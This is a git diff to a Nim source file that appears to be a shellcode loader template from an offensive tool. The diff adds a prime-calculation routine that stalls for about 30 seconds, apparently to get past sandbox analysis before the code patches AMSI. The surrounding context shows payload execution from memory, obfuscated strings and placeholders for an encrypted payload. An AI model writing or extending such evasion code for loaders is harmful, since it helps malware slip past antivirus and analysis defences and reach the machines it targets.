@@ -26,6 +26,7 @@ import os
 import dynlib
 import base64
 import osproc
+import math
 from bitops import bitor
 
 ### Modified code from Nim-Strenc to avoid XORing of long strings
@@ -77,6 +78,32 @@ proc rscvp(payload: openArray[byte]): void =
 #     copyMem(allocated, payload[0].unsafeAddr, len(payload))
 #     let f = cast[proc(){.nimcall.}](allocated)
 #     f()
+
+when defined calcPrimes:
+    proc calcPrimes(seconds: int): int {.noinline.} =
+        var finalPrime: int = 0
+        var max: int = seconds * 68500
+
+        when defined verbose:
+            echo "[*] Sleeping for approx. ", time, " seconds"
+
+        for n in countup(2, max):
+            var ok: bool = true
+            var i: int = 2
+
+            while i.float <= sqrt(n.float):
+                if (n mod i == 0):
+                    ok = false
+                inc(i)
+
+            if n <= 1:
+                ok = false
+            elif n == 2:
+                ok = true
+            if ok == true:
+                finalPrime = n
+
+        return finalPrime
 
 when defined patchAmsi:
     # Get the AMSI patch bytes based on arch
@@ -283,6 +310,9 @@ proc mainMain() : void =
     #[ PLACEHOLDERCRYPTEDINPUT ]#
     #[ PLACEHOLDERCRYPTEDSHELLYCOAT ]#
     #[ PLACEHOLDERCRYPTIV ]#
+
+    when defined calcPrimes:
+        discard calcPrimes(30)
 
     when defined patchAmsi:
         # Patch AMSI
